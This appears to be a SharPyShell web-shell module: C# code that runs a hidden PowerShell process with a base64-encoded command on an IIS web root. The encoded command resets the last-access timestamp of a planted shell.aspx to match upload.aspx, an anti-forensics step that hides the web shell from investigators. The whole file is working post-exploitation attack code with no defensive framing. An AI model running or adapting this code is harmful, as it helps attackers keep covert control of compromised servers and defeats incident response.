
                    using System;using System.IO;using System.Diagnostics;using System.Text;
                    public class SharPyShell
                    {                    
                        string ExecPs(string encoded_command, string working_path)
                        {
                            ProcessStartInfo pinfo = new ProcessStartInfo();
                            pinfo.FileName = Environment.GetEnvironmentVariable("SYSTEMROOT") +  @"\System32\WindowsPowerShell\v1.0\powershell.exe";
                            pinfo.Arguments = " -nop -noni -enc " + encoded_command;
                            pinfo.RedirectStandardOutput = true;
                            pinfo.RedirectStandardError = true;
                            pinfo.UseShellExecute = false;
                            pinfo.WorkingDirectory = working_path;
                            Process p = new Process();
                            try{
                                p = Process.Start(pinfo);
                            }
                            catch (Exception e){
                                return "{{{SharPyShellError}}}\n" + e;
                            }
                            StreamReader stmrdr_output = p.StandardOutput;
                            StreamReader stmrdr_errors = p.StandardError;
                            string output = "";
                            string stand_out = stmrdr_output.ReadToEnd();
                            string stand_errors = stmrdr_errors.ReadToEnd();
                            stmrdr_output.Close();
                            stmrdr_errors.Close();
                            if (!String.IsNullOrEmpty(stand_out))
                                output = output + stand_out;
                            if (!String.IsNullOrEmpty(stand_errors))
                                output = output + "{{{SharPyShellError}}}\n " + stand_errors;
                            return output;
                        }

                        public byte[] ExecRuntime()
                        {
                            string output_func=ExecPs(@"JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAKABHAGUAdAAtAEkAdABlAG0AIABDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAHcAZQBiAGEAcABwAFwAcwBoAGUAbABsAC4AYQBzAHAAeAApAC4AbABhAHMAdABhAGMAYwBlAHMAcwB0AGkAbQBlACAAPQAgAEcAZQB0AC0ARABhAHQAZQAgACgAKABHAGUAdAAtAEkAdABlAG0AIABDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAHcAZQBiAGEAcABwAFwAdQBwAGwAbwBhAGQALgBhAHMAcAB4ACAAKQAuAGwAYQBzAHQAYQBjAGMAZQBzAHMAdABpAG0AZQApAA==", @"C:\inetpub\wwwroot\webapp");
                            byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                            return(output_func_byte);
                        }
                    }
                    